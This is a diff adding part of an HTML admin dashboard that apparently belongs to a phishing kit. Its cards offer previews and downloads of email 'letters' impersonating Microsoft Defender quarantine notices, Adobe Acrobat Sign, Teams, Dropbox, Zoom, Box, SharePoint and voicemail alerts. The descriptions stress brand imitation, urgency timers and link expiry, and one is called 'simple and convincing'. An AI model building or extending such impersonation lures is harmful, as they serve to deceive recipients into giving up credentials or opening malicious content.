+          </div>
+        </div>
+
+        <!-- Voicemail -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #0a84ff;border-top:3px solid #0a84ff;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#0a84ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:18px">📞</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Voicemail Letter</div>
+              <div style="font-size:11px;color:#0a84ff">iOS-style dark notification</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Full dark iOS-style letter with CSS animated phone ring, CSS waveform bars, AI transcript card, Call Back / Message / Delete action buttons.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/voicemail_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(10,132,255,.2);color:#60a5fa;border:1px solid #0a84ff;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/voicemail_letter" download="Voicemail_Letter.html" style="flex:1;background:#0a84ff;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Adobe -->
+        <div style="background:#1a0000;border:1px solid #FA0F00;border-top:3px solid #FA0F00;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#FA0F00;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;color:#fff;font-style:italic">Ac</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Adobe Acrobat Sign Letter</div>
+              <div style="font-size:11px;color:#FA0F00">Dark red · Timeline signing flow</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">CSS A-flag logo on dark red grid background. Vertical timeline signing process. CSS torn-corner document icon. Mini MS 4-square for verification note.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/adobe_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(250,15,0,.2);color:#f87171;border:1px solid #FA0F00;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/adobe_letter" download="Adobe_Letter.html" style="flex:1;background:#FA0F00;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Quarantine -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #d13438;border-top:3px solid #d13438;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#d13438;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:18px">🛡️</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Quarantine Letter</div>
+              <div style="font-size:11px;color:#d13438">Microsoft Defender · Email Blocked</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Clean MS 365 email quarantine notice. Action Required header, blocked email preview, Release / Block buttons, expiry timer. Simple and convincing.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/quarantine_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(209,52,56,.2);color:#f87171;border:1px solid #d13438;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/quarantine_letter" download="Quarantine_Letter.html" style="flex:1;background:#d13438;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Teams Letter -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #6264A7;border-top:3px solid #6264A7;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#6264A7;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;color:#fff">T</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Microsoft Teams Letter</div>
+              <div style="font-size:11px;color:#8b8fcc">Teams · File Shared in Channel</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Dark purple Teams-branded card. File attachment block, channel hashtag pill, stat counters (pages / MB / recipients), dark footer.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/teams_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(98,100,167,.2);color:#9b99ff;border:1px solid #6264A7;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/teams_letter" download="Teams_Letter.html" style="flex:1;background:#6264A7;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Dropbox Letter -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #0061FF;border-top:3px solid #0061FF;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#0061FF;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;color:#fff">DB</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Dropbox Business Letter</div>
+              <div style="font-size:11px;color:#60a5fa">Dropbox · Shared Folder</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Dropbox blue branding, file list with sizes, urgency header, download button, 7-day link expiry note.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/dropbox_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(0,97,255,.2);color:#60a5fa;border:1px solid #0061FF;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/dropbox_letter" download="Dropbox_Letter.html" style="flex:1;background:#0061FF;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Zoom Letter -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #2D8CFF;border-top:3px solid #2D8CFF;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#2D8CFF;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px">▶</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Zoom Recording Letter</div>
+              <div style="font-size:11px;color:#93c5fd">Zoom Cloud · Meeting Recording Ready</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Zoom blue, dark play-card thumbnail with REC indicator, meeting metadata grid, Watch / Download / Share buttons.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/zoom_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(45,140,255,.2);color:#93c5fd;border:1px solid #2D8CFF;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/zoom_letter" download="Zoom_Letter.html" style="flex:1;background:#2D8CFF;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- Box Letter -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #0061D5;border-top:3px solid #0061D5;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#0061D5;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;color:#fff">Box</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">Box Secure File Letter</div>
+              <div style="font-size:11px;color:#60a5fa">Box · Encrypted Confidential Share</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">CONFIDENTIAL watermark document preview, AES-256 encryption badge, access info grid, 48h urgency warning, Unlock / Download / Request buttons.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/box_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(0,97,213,.2);color:#60a5fa;border:1px solid #0061D5;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/box_letter" download="Box_Letter.html" style="flex:1;background:#0061D5;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- SharePoint Letter -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #038387;border-top:3px solid #038387;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#038387;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#fff">S</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">SharePoint Letter</div>
+              <div style="font-size:11px;color:#6ee7e7">Microsoft SharePoint · Document Shared</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Teal Microsoft SharePoint branding, Word doc card with blue left border, stat row (pages/MB/format), urgency action note, Open in SharePoint + Download + Open in Word buttons.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/sharepoint_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(3,131,135,.2);color:#6ee7e7;border:1px solid #038387;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/sharepoint_letter" download="SharePoint_Letter.html" style="flex:1;background:#038387;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+  <script src="../js/admin-dashboard.js"></script>
+  <script>
+    // Live clock in header
+    function updateClock() {
+      const now = new Date();
+      const el = document.getElementById('headerTime');
+      if (el) {
+        el.textContent = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+      }
+    }
+    updateClock();
+    setInterval(updateClock, 30000);
+  </script>
+</body>
+</html>
